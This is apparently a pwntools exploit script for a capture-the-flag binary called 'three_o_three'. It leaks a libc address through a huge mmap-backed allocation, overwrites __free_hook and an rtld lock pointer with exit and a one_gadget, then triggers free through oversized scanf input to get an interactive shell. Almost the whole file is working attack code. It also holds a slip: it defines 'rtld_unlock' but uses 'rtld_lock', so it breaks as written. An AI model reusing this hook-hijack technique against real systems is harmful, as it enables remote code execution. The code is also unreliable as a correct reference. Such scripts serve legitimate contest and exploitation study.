from pwn import *
from time import sleep
'''
r = remote('services.svattt.com', 4085)

poW = r.recvline(keepends = False)
poW = poW[:-4].split(' XOR ')
poW = int(poW[0]) ^ int(poW[1])
r.sendline(str(poW))
'''
r = process("./three_o_three", env = {'LD_PRELOAD':'./libc.so.6'})

libc = ELF('./libc.so.6')

# Enter a very big size so that malloc calls mmap and return a page right above libc
r.sendlineafter('Size:', '1000000000')
r.recvuntil('Magic:')
magic = int(r.recvline(keepends = False), 16)
base_libc = magic + 1000001520
log.info("Magic: " + hex(magic))
log.info("libc: " + hex(base_libc))

free_hook = base_libc + libc.symbols['__free_hook']
exit = base_libc + libc.symbols['exit']
one_gadget = base_libc + 0x4f322
rtld_unlock = base_libc + 6397800
# Use the first write to overwrite __free_hook to exit
r.sendlineafter('offset:', str((free_hook - magic) / 8))
r.sendlineafter('value:', str(exit))
# Use the second write to overwrite the ptr to rtld_lock_default_unlock_recursive in _rtld_global to one_gadget
r.sendlineafter('offset:', str((rtld_lock - magic) / 8))
r.sendlineafter('value:', str(one_gadget))
# Pass a very large string into scanf so that it calls free
r.sendlineafter('offset:', '1'*0x800)

r.interactive()